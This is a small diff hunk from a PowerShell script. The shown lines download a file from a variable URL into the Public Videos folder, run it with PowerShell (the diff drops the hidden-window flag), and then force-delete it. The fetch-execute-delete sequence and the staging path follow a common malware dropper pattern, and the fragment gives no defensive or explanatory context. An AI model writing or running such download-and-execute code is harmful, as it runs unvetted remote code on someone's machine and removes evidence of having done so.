@@ -8,7 +8,7 @@ $scriptPath = "C:\Users\Public\Videos\downloader.ps1"
 Invoke-WebRequest -Uri $url -OutFile $scriptPath -UseBasicParsing
 
 # Execute the downloaded script silently
-Start-Process powershell.exe -ArgumentList "-File $scriptPath" -WindowStyle Hidden -Wait
+Start-Process powershell.exe -ArgumentList "-File $scriptPath" -Wait
 
 # Remove the downloaded script file
 Remove-Item $scriptPath -Force
